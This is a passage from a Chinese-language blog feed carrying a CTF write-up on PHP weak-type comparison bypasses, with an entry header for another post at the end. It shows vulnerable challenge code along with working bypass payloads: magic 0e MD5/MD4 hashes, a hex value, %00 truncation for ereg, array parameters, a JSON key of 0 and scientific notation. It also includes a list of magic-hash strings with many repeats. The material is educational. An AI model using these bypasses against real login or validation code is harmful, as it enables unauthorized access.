class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>$md51 = md5(&#x27;QNKCDZO&#x27;);<br>$a = @$_GET[<span class="hljs-string">&#x27;a&#x27;</span>];<br>$md52 = @md5($a);<br><span class="hljs-keyword">if</span>(isset($a)) &#123;<br>if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123;<br>echo <span class="hljs-string">&quot;flag&#123;*&#125;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>echo <span class="hljs-string">&quot;false!!!&quot;</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>echo <span class="hljs-string">&quot;please input a&quot;</span>;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>字符串QNKCDZO被md5加密后之后是前两位为<code>0e</code>，然后我们找一个字符串的md5之后的结果也为e0xxx的就可以绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?a=s878926199a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201103191138163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>原理：</p><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，</p><p>所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><p>以下字符串，md5哈希值都是0e开头的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c">QNKCDZO<br><span class="hljs-number">0e830400451993494058024219903391</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br><br>s1502113478a<br><span class="hljs-number">0e861580163291561247404381396064</span><br><br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br><br>s1836677006a<br><span class="hljs-number">0e481036490867661113260034900752</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s1184209335a<br><span class="hljs-number">0e072485820392773389523109082030</span><br><br>s1665632922a<br><span class="hljs-number">0e731198061491163073197128363787</span><br><br>s1502113478a<br><span class="hljs-number">0e861580163291561247404381396064</span><br><br>s1836677006a<br><span class="hljs-number">0e481036490867661113260034900752</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s1502113478a<br><span class="hljs-number">0e861580163291561247404381396064</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s1665632922a<br><span class="hljs-number">0e731198061491163073197128363787</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s1836677006a<br><span class="hljs-number">0e481036490867661113260034900752</span><br><br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br><br>s532378020a<br><span class="hljs-number">0e220463095855511507588041205815</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><br>s1502113478a<br><span class="hljs-number">0e861580163291561247404381396064</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s1665632922a<br><span class="hljs-number">0e731198061491163073197128363787</span><br><br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br><br>s1836677006a<br><span class="hljs-number">0e481036490867661113260034900752</span><br><br>s1665632922a<br><span class="hljs-number">0e731198061491163073197128363787</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br></code></pre></td></tr></table></figure><h2 id="9-十六进制与数字比较"><a href="#9-十六进制与数字比较" class="headerlink" title="9. 十六进制与数字比较"></a>9. 十六进制与数字比较</h2><p><a href="http://123.206.87.240:9009/20.php">http://123.206.87.240:9009/20.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-function">function <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($temp)</span> </span>&#123;<br>$flag = &#x27;flag&#123;test&#125;&#x27;;<br>$one = ord(<span class="hljs-string">&#x27;1&#x27;</span>);<br><span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span><br>$nine = ord(<span class="hljs-string">&#x27;9&#x27;</span>);<br><span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span><br>$number = &#x27;3735929054&#x27;;<br><span class="hljs-comment">// Check all the input characters!</span><br><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-built_in">strlen</span>($number); $i++) &#123;<br><span class="hljs-comment">// Disallow all the digits!</span><br>$digit = ord($temp &#123;$i&#125;);<br><span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123;<br><span class="hljs-comment">// Aha, digit not allowed!</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flase&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>($number == $temp)<br><span class="hljs-keyword">return</span> $flag;<br>&#125;<br>$temp = $_GET[&#x27;password&#x27;];<br><span class="hljs-function">echo <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($temp)</span></span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>参数不能有1-9的数字，同时要求该参数值为3735929054，所以把值转换成十六进制传参。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Payload: ?password=<span class="hljs-number">0xdeadc0de</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102122943381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="10-ereg正则-00截断"><a href="#10-ereg正则-00截断" class="headerlink" title="10. ereg正则%00截断"></a>10. ereg正则%00截断</h2><p><a href="http://123.206.87.240:9009/5.php">http://123.206.87.240:9009/5.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>$flag = <span class="hljs-string">&quot;xxx&quot;</span>;<br>if (isset ($_GET[&#x27;password&#x27;])) &#123;<br>if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123;<br>echo &#x27;You password must be alphanumeric&#x27;;<br>&#125; else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123;<br>if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos — 查找字符串首次出现的位置 &#123;<br>die(&#x27;Flag: &#x27; . $flag);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>echo(&#x27;have not been found&#x27;);<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>echo &#x27;Invalid password&#x27;;<br>&#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>传入的值必须是数字或大小写字符，长度小于8且大于9999999,且匹配到”<em>-</em>“才能输出flag。</p><p>可以使用<code>%00</code>来截断，当ereg函数读到 <code>%00</code>的时候，就截止了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1e8</span>%<span class="hljs-number">00</span>*-*<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102124459121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="11-strpos数组绕过"><a href="#11-strpos数组绕过" class="headerlink" title="11. strpos数组绕过"></a>11. strpos数组绕过</h2><p><a href="http://123.206.87.240:9009/15.php">http://123.206.87.240:9009/15.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>$flag = <span class="hljs-string">&quot;flag&quot;</span>;<br>if (isset ($_GET[&#x27;ctf&#x27;])) &#123;<br>if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;ctf&#x27;]) === FALSE)<br>     echo &#x27;必须输入数字才行&#x27;; <br>else if (strpos ($_GET[&#x27;ctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE)<br>     die(&#x27;Flag: &#x27;.$flag); <br><span class="hljs-keyword">else</span><br>     echo &#x27;骚年，继续努力吧啊~&#x27;;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>要求传入的参数为数字并且包含字符串“#biubiubiu”，有点难搞。</p><p>可以通过数组绕过<code>strpos</code>与<code>ereg</code>函数，遇到数组返回NULL，数值和类型相同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Payload: ?ctf[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102125444628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="12-数字验证正则绕过"><a href="#12-数字验证正则绕过" class="headerlink" title="12. 数字验证正则绕过"></a>12. 数字验证正则绕过</h2><p><a href="http://123.206.87.240:9009/21.php">http://123.206.87.240:9009/21.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>error_reporting(<span class="hljs-number">0</span>);<br>$flag = &#x27;flag&#123;test&#125;&#x27;;<br>if (&quot;POST&quot; == $_SERVER[&#x27;REQUEST_METHOD&#x27;]) &#123;<br>$password = $_POST[&#x27;password&#x27;];<br>if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) //preg_match — 执行一个正则表达式匹配 &#123;<br>echo &#x27;flag&#x27;;<br><span class="hljs-built_in">exit</span>;<br>&#125;<br><span class="hljs-keyword">while</span> (TRUE) &#123;<br>$reg = &#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all($reg, $password, $arr))<br><span class="hljs-keyword">break</span>;<br>$c = <span class="hljs-number">0</span>;<br>$ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;);<br><span class="hljs-comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br>foreach ($ps as $pt) &#123;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[[:$pt:]]+/&quot;</span>, $password))<br>$c += <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">if</span> ($c &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;42&quot;</span> == $password) <br>              echo $flag; <br>        <span class="hljs-keyword">else</span> <br>              echo &#x27;Wrong password&#x27;;<br><span class="hljs-built_in">exit</span>;<br>&#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>代码中涉及到的一些正则函数</p><table><thead><tr><th>正则匹配函数</th><th>描述</th><th>区别</th></tr></thead><tbody><tr><td>preg_match</td><td>执行一个正则表达式匹配，匹配到则返回1，匹配不到则返回0</td><td>第一次匹配成功后就停止匹配</td></tr><tr><td>preg_match_all</td><td>执行一个全局正则表达式匹配，返回成功模式匹配的次数，并将匹配结果存储到一个数组中</td><td>匹配到字符串结束为止</td></tr></tbody></table><p>下面还有几个正则匹配的字符：</p><table><thead><tr><th>正则匹配字符</th><th>描述</th><th>ASCII</th></tr></thead><tbody><tr><td>[:graph:]</td><td>除空格，TAB外的所有字符</td><td>[\x21-\x7E]</td></tr><tr><td>[a-zA-Z0-9]</td><td>大小写字母和数字</td><td>[a-zA-Z0-9]</td></tr><tr><td>[:alpha:]</td><td>大小写字母</td><td>[a-zA-Z]</td></tr><tr><td>[:punct:]</td><td>任何标点符号</td><td>[!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{} ~]</td></tr><tr><td>[:digit:]</td><td>任何数字</td><td>[0-9]</td></tr><tr><td>[:upper:]</td><td>任何大写字母</td><td>[A-Z]</td></tr><tr><td>[:lower:]</td><td>任何小写字母</td><td>[a-z]</td></tr></tbody></table><p>代码审计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">请求方法必须为POST<br><span class="hljs-number">1</span>、正则匹配，[:graph:]为任意字符，要求password长度超过<span class="hljs-number">12</span><br><span class="hljs-number">2</span>、password中必须包含标点符号，数字，大写字母，小写字母，并且检测次数要超过<span class="hljs-number">6</span>次<br><span class="hljs-number">3</span>、标点符号，数字，大写字母，小写字母，包含<span class="hljs-number">3</span>种以上绕过<br><span class="hljs-number">4</span>、弱类型比较，42abc,强制转换为数字<br></code></pre></td></tr></table></figure><p>构造Payload，居然提示<code>Wrong password</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload: password=42BugKuctf.a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201103190435176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>仔细看了一下代码，变量原来是flag，改一下Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload: flag=42BugKuctf.a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020110318591559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>这道题有点奇怪，随便post一个值也能得到flag，小小脑袋有大大疑问。<br><img src="https://img-blog.csdnimg.cn/20201103185441793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="13-md4绕过"><a href="#13-md4绕过" class="headerlink" title="13.md4绕过"></a>13.md4绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>] != hash(<span class="hljs-string">&quot;md4&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>])) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Theshy is locked&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码中get进来的参数a，使<code>a=md4(a)</code>才行。</p><p>百度一下md4绕过，发现可以通过科学计算法比较绕过。找一个值是一个科学计算法0e开头的，其md4加密后也为0e开头，弱类型比较绕过。</p><table><thead><tr><th>a</th><th>md4(a)</th></tr></thead><tbody><tr><td>0e251288019</td><td>0e874956163641961271069404332409</td></tr><tr><td>0e001233333333333334557778889</td><td>0e434041524824285414215559233446</td></tr><tr><td>Payload为：</td><td></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=<span class="hljs-number">0e251288019</span><br>或<br>?a=<span class="hljs-number">0e001233333333333334557778889</span><br></code></pre></td></tr></table></figure><h2 id="14-json绕过"><a href="#14-json绕过" class="headerlink" title="14.json绕过"></a>14.json绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$message</span> = json_decode(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>]);<br>    <span class="hljs-variable">$key</span> =<span class="hljs-string">&quot;*********&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$message</span>-&gt;key == <span class="hljs-variable">$key</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;~~~~&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输入一个数组进行json解码，解码后的message与key值相同才会得到flag，使用弱类型进行绕过，key肯定是字符串，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了，通过0==”admin”这种形式绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: message=&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="15-科学计数法绕过"><a href="#15-科学计数法绕过" class="headerlink" title="15.科学计数法绕过"></a>15.科学计数法绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login&quot;</span>]))  <br>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>]))<br>  &#123;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;[a-zA-Z0-9]&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>    &#123;<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;give you flag)&quot;)&lt;/script&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">elseif</span> (strlen(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>]) &lt; <span class="hljs-number">10</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>] &gt; <span class="hljs-number">987654321</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>], <span class="hljs-string">&#x27;#BIG#&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>      &#123;<br>        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./flag.php&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Congratulations! FLAG is : &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);<br>      &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);<br>    &#125;<br>  &#125;<br>&#125;<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码审计：</p><p>1.isset函数，POST传入参数login和yingzi。<br>2.strlen函数，参数yingzi的值长度小于10，且数值大于987654321。<br>3.strpos函数，参数yingzi的值是否匹配<code>#BIG#</code>，如果有，则包含一个flag.php文件，输出flag。</p><p>使用科学计数法绕过strlen函数，令yingzi=e9，此时strlen=3，为了匹配<code>#BIG#</code>，所以yingzi=1e9#BIG#</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: login=<span class="hljs-number">1</span>&amp;yingzi=<span class="hljs-number">1e9</span><span class="hljs-comment">#BIG#</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210201120107109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：PHP弱类型绕过方法&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="代码审计" scheme="http://atkx.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-Web-信息泄露练习</title>
    <link href="http://atkx.top/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/"/>
    <id>http://atkx.top/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/</id>
    <published>2020-10-24T15:55:23.000Z</published>
    <updated>2021-04-04T14:02:30.030Z</updated>
    
